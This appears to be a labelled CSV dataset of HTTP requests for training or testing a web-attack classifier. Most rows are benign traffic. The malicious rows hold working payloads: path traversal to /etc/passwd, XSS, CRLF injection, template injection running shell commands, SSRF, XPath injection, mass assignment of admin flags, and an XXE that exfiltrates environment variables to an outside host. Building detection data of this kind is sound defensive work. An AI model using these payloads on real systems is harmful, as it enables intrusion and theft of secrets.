label,text
benign,"GET /forums/thread/view?id=thread-93ab6c7f8d HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: close
Referer: https://community.game-dev-forum.org/forums"
benign,"GET /api/v3/items/search?id=search_batch_0112 HTTP/1.1
Host: inventory-management.cloud
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
DNT: 1
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
X-Requested-With: XMLHttpRequest"
benign,"GET /news/weather/daily/region/us-northeast HTTP/1.1
Host: climate-insights-service.ai
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N975U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/xml, text/xml;q=0.9
Accept-Language: en-US,en;q=0.7
If-None-Match: ""74b1f42e6c3a2""
Connection: keep-alive"
benign,"GET /dashboard/user/profile?cmd=view_details HTTP/1.1
Host: account-secure-portal.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://account-secure-portal.org/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"POST /upload/avatar HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/settings/avatar
Content-Type: multipart/form-data; boundary=----BoundaryAvatar123
Content-Length: 280

------BoundaryAvatar123
Content-Disposition: form-data; name=""file""; filename=""profile_pic.png""
Content-Type: image/png

(binary PNG image content benign placeholder)
------BoundaryAvatar123--"
benign,"GET /v3/orders/3521/detail.xml HTTP/1.1
Host: secure-orders-cloud.biz
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.validtokenstringhere
Accept-Language: en-US,en;q=0.9"
benign,"POST /shop/cart/add-item HTTP/1.1
Host: online-retail-store.biz
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://online-retail-store.biz/products/electronics/headphones
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Cookie: cart_id=xyz1234; user_token=def5678
Content-Length: 42

product_id=9853&quantity=2&promo_code=FALL20"
benign,"GET /blog/articles/healthy-lifestyle-tips HTTP/1.1
Host: holistic-wellness-hub.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.6
DNT: 1
Connection: keep-alive
Referer: https://holistic-wellness-hub.info/blog"
benign,"GET /css/main-responsive.css HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://my-personal-blog-site.info/blog/article/view/123
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"GET /api/reports/report-43814.xml HTTP/1.1
Host: global-health-monitoring.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/xml
Referer: https://dashboard.global-health-monitoring.ai/
Connection: keep-alive"
malicious,"GET /app/user/avatar/..%2F..%2F..%2F..%2Fetc/passwd HTTP/1.1
Host: cloud-media-cache.store
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest"
benign,"GET /docs/openapi.json HTTP/1.1
Host: cloud-backup-vault.net
Accept: application/json
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"GET /api/v1/articles?author_id=8392&tag=technology&tag=innovation&start_date=2024-01-01&end_date=2024-06-15&lang=en&sort=recent&limit=10&offset=20&include_comments=true&format=json HTTP/1.1
Host: content-nexus.ai
Connection: keep-alive
Accept: application/json
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36"
malicious,"POST /blog/article/comment HTTP/1.1
Host: writers-digest.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
X-Custom-Header: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnbG9uZycpeDwvc2NyaXB0Pg==""></iframe>
Content-Length: 31

article_id=1123&comment=Great post!"
benign,"GET /v1/events/recent?pageToken=RXZlbnRzLTIwMjM=&filters=eyJzZXJ2aWNlIjoiY29mZmVlIn0= HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Language: en-GB,en;q=0.7
Connection: keep-alive"
benign,"PATCH /api/v1/users/98432/profile HTTP/1.1
Host: data-sync-center.io
Authorization: Bearer ga92nsmx4c8532zmuqfjpl26er
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive

[
  {""op"": ""replace"", ""path"": ""/email"", ""value"": ""linda.garcia@datasync.io""},
  {""op"": ""add"", ""path"": ""/preferences/newsletter"", ""value"": true}
]"
malicious,"GET /account/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"POST /session/destroy HTTP/1.1
Host: api.cloud-data-services.ai
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: https://api.cloud-data-services.ai/account/settings
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.xUJOmh1pl4kGbaVdFj3k1zMfUdiUxWv7lmCaKQrQkLI; locale=fr-FR
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Content-Length: 27

csrf_token=cB7uH9yXTRQ9vKiL0vplDA=="
benign,"PUT /users/4532/profile-picture HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer NjAxMjM0NTZBQkNERUZH
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
X-CSRF-Token: e9a3d45f8bf923c122d56a9a43123dd7
Content-Length: 198
Connection: keep-alive

{""userId"":4532,""avatar_thumbnail_b64"":""iVBORw0KGgoAAAANSUhEUgAAAC8AAAA8CAYAAAA33FmfAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABwESAAMAAAABAAEAAIdpAAQAAAABAAABEqAAAAAAAAABaAAAAAADW6hJrAAABFUlEQVRYw+3XwQ2AIAwF0P//P2llMyOE7AQKuF46ZCq6Q6yDm0+74HxAICLB7nDdeekWyASC1jUKPYZKZTEBcGUMT/TjyAlEa6rbKVbq98/1weBy2x0FkANRMUIVprB3pmKjnDHphgDBrK87ftY6/wD0q8ntAYt7kLgAEv7PRxR6CNQ2DQwgAAQUFE1NU0rMkhIIHwZAAeMbQBAQEEO0Nb5AFkJDhCSAQISLtFvpJaRVF3fpM1o8EX0UXfKiI9rQIgZrpvqlauka6okjpS032qUklwqEf6fIUT7Dw1HTy6JgAAAABJRU5ErkJggg==""}"
benign,"HEAD /community/forums/topic/3421 HTTP/1.1
Host: game-dev-network.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Referer: https://game-dev-network.org/community/forums
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: financial-services-hub.co
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"GET /api/v1/maps/tiles/region42/zoom12/15/20.png HTTP/1.1
Host: geo-map-api.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Range: bytes=0-1023
Accept-Language: en
Via: 1.1 varnish
Connection: keep-alive"
benign,"POST /api/upload/image HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.85.0
Accept: */*
Content-Type: multipart/form-data; boundary=----Boundary123456
Content-Length: 348
Connection: close

------Boundary123456
Content-Disposition: form-data; name=""file""; filename=""photo_sample.jpg""
Content-Type: image/jpeg

(binary image content placeholder)
------Boundary123456--"
malicious,"GET /registration/validate?username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: login-gateway.cloud-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: close"
malicious,"POST /service/request HTTP/1.1
Host: devops-monitoring-hub.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: keep-alive
X-Requested-With: XMLHttpRequest

fetch_url=gopher://127.0.0.1:6379/_%09PING%0D%0A"
benign,"GET /swagger/v1/swagger.json HTTP/1.1
Host: openweather-api.intellidata.cloud
Accept: application/json
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
X-Forwarded-For: 192.168.0.15"
malicious,"GET /profile/view%0d%0aX-Injected-Header:%20InjectedValue%0d%0aContent-Length:%2024%0d%0a%0d%0a<script>fetch('/xss')</script> HTTP/1.1
Host: identity-secure-gateway.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: digital-library-archive.ai
User-Agent: StudyCrawler/2.0 (+http://studycrawler.net/info)
Accept: */*
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /portal/fetch_asset.jsp?file=../../../../../../../../etc/passwd HTTP/1.1
Host: smart-hospital-portal.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close"
malicious,"GET /dashboard/stats HTTP/1.1
Host: dev-monitoring-tool.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate, br
Referer: https://dev-monitoring-tool.io/metrics{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20/var/log/syslog|tail%20-n%205').read() }} #}
Accept-Language: en-US,en;q=0.7"
benign,"GET /search?q=wireless+keyboards HTTP/1.1
Host: gadgets-marketplace.net
X-Forwarded-For: 10.0.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Connection: keep-alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Length: 31

{""UNION ALL"": ""search_query_active""}"
benign,"OPTIONS /api/v1/weather/current HTTP/1.1
Host: meteorology-data-exchange.info
Origin: https://local-weather-widget.app
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Access-Control-Request-Headers: Accept, X-Requested-With
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /posts/comment/create HTTP/1.1
Host: tech-insights-journal.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://tech-insights-journal.com/posts/456

comment=Is+it+built+into+the+browser+to+recognize+the+%3Ca+onclick%3D%22alert('hello')%3B%22%3Eanchor+tags%3C%2Fa%3E+with+JavaScript+event+handlers+like+onClick%3F"
benign,"GET /media/library/search?title=classical+symphonies&composer=beethoven&instrument=violin&year_from=1750&year_to=1850&format=mp3,wav&duration_max=3600&sort=popularity_desc&page=2&limit=25&user_prefs=high_quality,offline_mode HTTP/1.1
Host: symphonic-audiofiles.org
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Accept-Language: en"
benign,"POST /api/contacts/bulk HTTP/1.1
Host: marketing-crm-solutions.com
User-Agent: python-requests/2.28.1
Content-Type: application/json
Accept: application/json
Content-Length: 177
Cache-Control: no-cache

{""contacts"":[{""name"":""Alice Johnson"",""email"":""alice.johnson@mailservice.org""},{""name"":""Robert Lee"",""email"":""robert.lee@mailservice.org""},{""name"":""Monica Ruiz"",""email"":""monica.ruiz@mailservice.org""}]}"
malicious,"POST /api/users HTTP/1.1
Host: login.online-retail-store.biz
Content-Type: application/json
X-CSRF-Token: 5ffac9a17e614f64b1d1c0a2a54306dd
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://login.online-retail-store.biz/signup
Cache-Control: max-age=0

{
  ""username"": ""mike.brown"",
  ""email"": ""mike.brown@online-retail-store.biz"",
  ""plan_id"": ""premium"",
  ""Is_Admin"": true
}"
benign,"GET /widgets/data-feed?limit=10&format=jsonp&callback=processData HTTP/1.1
Host: analytics-marketing-solutions.com
Connection: keep-alive
Accept: application/javascript
User-Agent: curl/7.85.0
Accept-Encoding: deflate, gzip"
benign,"GET /control/panel?filter[type]=admin&filter[active]=true HTTP/1.1
Host: client.enterprise-backend.com
Accept-Language: en-US,en;q=0.8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Cache-Control: no-store
Connection: keep-alive"
benign,"GET /reports/daily?exec=fetch_summary&date=2024-06-05 HTTP/1.1
Host: data-insights-center.net
User-Agent: Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"POST /api/item/search HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept: application/xml
Content-Type: application/xml
Content-Length: 126

<searchRequest>
  <term>' or //node() or ''='</term>
  <category>blog_posts</category>
</searchRequest>"
benign,"POST /upload/image HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.10
Content-Type: multipart/form-data; boundary=----Abcdef1234567
Origin: https://online-retail-store.biz
Cookie: session_id=Lm9QJ9Ey8Rb4wUm1PCazbH65gKu4R3Zh
Content-Length: 340
Connection: keep-alive

------Abcdef1234567
Content-Disposition: form-data; name=""album_id""

247
------Abcdef1234567
Content-Disposition: form-data; name=""caption""

Display photo for Spring Catalog
------Abcdef1234567
Content-Disposition: form-data; name=""image_file""; filename=""spring_collection.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------Abcdef1234567--"
malicious,"POST /apps/api/v3/config HTTP/1.1
Host: microservice-dataflow.ai
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/x-www-form-urlencoded,application/json
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 303

config_b64=TzoyNDoiTW9ub2xvZ1xMZXZlbFwiOjE6e3M6MzoibG9nIjtzOjY6InVzZXI2OSI7czo4OiJfX2NsYXNzIjtzOjk6IkxvZ2dlckxvZ2dlclwiO30=&active=1"
benign,"GET /blog/article/view/5237?param=Hello%2520World HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://my-personal-blog-site.info/blog
Cache-Control: no-cache"
benign,"GET /assets/javascript/analytics.js HTTP/1.1
Host: daily-trendwatcher.info
Accept: application/javascript
Referer: https://daily-trendwatcher.info/articles/what-is-blockchain
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
DNT: 1
Connection: keep-alive"
benign,"GET /api/v1/devices/sensor-4593 HTTP/1.1
Host: iot-device-control.cloud
Accept: application/json
User-Agent: python-requests/2.28.1
Authorization: Token 5a2b3c4d5e6f7a8910111213
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /login HTTP/1.1
Host: secure-authentication-service.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Type: application/json
X-Debug-Options: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnYXV0aCBieXBhc3MnKTs8L3NjcmlwdD4=""></iframe>
Content-Length: 40

{""username"":""admin"",""password"":""password123""}"
benign,"POST /feedback/submit HTTP/1.1
Host: feedback-portal.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Length: 87
Connection: keep-alive
Origin: https://feedback-portal.biz
Referer: https://feedback-portal.biz/feedback
Cookie: session=3f8c4d2b1a7f96e4c5d3e2a1b0f9c8d7

user=julian_williams&comments=VGhlIGFwcCBpcyB2ZXJ5IGludWV0ZWQgYW5kIHVzZXItZnJpZW5kbHksIGV4Y2VsbGVudGx5IQ=="
benign,"POST /submit/document HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept: application/json, text/plain, */*
Referer: https://secure-user-portal.net/upload
Origin: https://secure-user-portal.net
Content-Type: multipart/form-data; boundary=----BoundaryX9UGbOeuL74x9Kw
Content-Length: 733
DNT: 1
Connection: keep-alive

------BoundaryX9UGbOeuL74x9Kw
Content-Disposition: form-data; name=""document""; filename=""meeting_notes.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"HEAD /services/health HTTP/1.1
Host: realtime-tracking-pro.io
User-Agent: python-requests/2.27.1
Accept: */*
Via: 1.1 proxy.tracking.local
Connection: close"
benign,"GET /api-docs/swagger.json HTTP/1.1
Host: next-gen-financial-platform.org
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /api/orders/20297 HTTP/1.1
Host: api.quick-shop.online
Authorization: Bearer cdef1234567890abcdef1234567890ab
Accept: application/json
Content-Type: application/json
User-Agent: curl/7.88.1
Content-Length: 175
Connection: close

{""orderId"":20297,""customerId"":12567,""items"":[{""productId"":342,""quantity"":2},{""productId"":576,""quantity"":1}],""status"":""processing"",""deliveryAddress"":""742 Evergreen Terrace, Springfield""}"
benign,"PUT /accounts/verify HTTP/1.1
Host: members.online-retail-store.biz
Authorization: Bearer xyz123456tokenabcdef
Content-Type: application/json
Accept: application/json, text/plain
User-Agent: curl/7.79.1
Content-Length: 62
Connection: close

{""emailVerified"": true, ""role"": ""customer"", ""isAdmin"": false}"
malicious,"POST /api/v3/logs/input HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 259
Connection: close

{""session_id"":""x0n23ab"",""action"":""login"", ""event_details"":""User logged in successfully\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""auth_check""}"
benign,"GET /articles/2024/04/weekly-update HTTP/1.1
Host: online-eduportal.io:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml
Referer: https://online-eduportal.io/home
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /api/v1/orders/create HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Token ZXY9876543210abcde12345fghij67890klmno
Content-Type: application/xml
Content-Length: 174
X-Request-ID: 729b643d-11fa-4e91-8dfa-4dfb268acce3
Idempotency-Key: 45ef45ac-bc60-4291-ac27-0b13608e76fc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: application/xml

<order><customerId>7832</customerId><items><item id=""15"" qty=""2"" /><item id=""102"" qty=""1"" /></items><shipping>express</shipping></order>"
malicious,"POST /xml/submit HTTP/1.1
Host: api.industrial-iot.cloud
User-Agent: curl/7.68.0
Content-Type: application/xml
Accept: */*
Connection: close
Content-Length: 290

<!DOCTYPE sensorData [
<!ENTITY % file SYSTEM ""file:///proc/self/environ"">
<!ENTITY % dtd SYSTEM ""http://data-exfiltrate.io/exfiltrate.dtd"">
%dtd;
%send;
]>
<sensorData>
  <temperature>24</temperature>
  <pressure>1013</pressure>
</sensorData>"
benign,"GET /user-profiles/john-doe HTTP/1.1
Host: innovative-creative-space.com
Accept: text/html
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: https://innovative-creative-space.com/community
Connection: keep-alive"
benign,"POST /account/password-reset HTTP/1.1
Host: premium-learning-platform.edu
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US
Connection: close
Origin: https://premium-learning-platform.edu
Referer: https://premium-learning-platform.edu/login

email=sophia.baker%40learningplatform.edu"
malicious,"POST /api/users HTTP/1.1
Host: secure-finance-portal.eu
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-CSRF-Token: Qf72LIuNwH3dX1kFmRGyzB0aJtYpC9Vx
Accept-Language: en-US,en;q=0.7
Content-Length: 109

{""username"":""financeuser324"",""email"":""financeuser324@secure-finance-portal.eu"",""is_Admin"":true,""plan_id"":""premiumplus"",""account_verified"":true}"
benign,"POST /signup HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: https://community.game-dev-forum.org
Referer: https://community.game-dev-forum.org/register
Connection: keep-alive
Cookie: forum_session=7f6e8a3b42cf9a8910ad5a6c

username=devgamer77&email=dev.gamer77%40community.game-dev-forum.org&password=WhoAmI!234&password_confirm=WhoAmI!234&terms_accepted=true"
malicious,"POST /content/submit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/xml
Accept: application/xml, text/html
Accept-Language: en-US
Content-Length: 175

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://localhost:3000/debug"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
